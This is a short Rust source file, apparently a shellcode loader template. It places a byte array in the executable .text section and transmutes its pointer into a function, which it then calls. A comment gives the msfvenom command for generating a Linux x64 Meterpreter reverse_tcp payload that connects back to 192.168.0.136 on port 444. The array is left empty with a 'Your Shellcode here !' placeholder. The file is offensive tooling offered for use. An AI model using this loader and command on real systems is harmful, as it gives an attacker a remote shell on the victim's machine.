

fn main() {

    // msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.0.136 lport=444 -f rust

    #[link_section = ".text"]
    static buf: [u8; 276] = [/*Your Shellcode here !*/];
    
    let buff_ptr: *const u8 = &buf as *const u8;

    unsafe {
        let exec = std::mem::transmute::<*const u8, fn()>(buff_ptr);
        exec();

    }

}
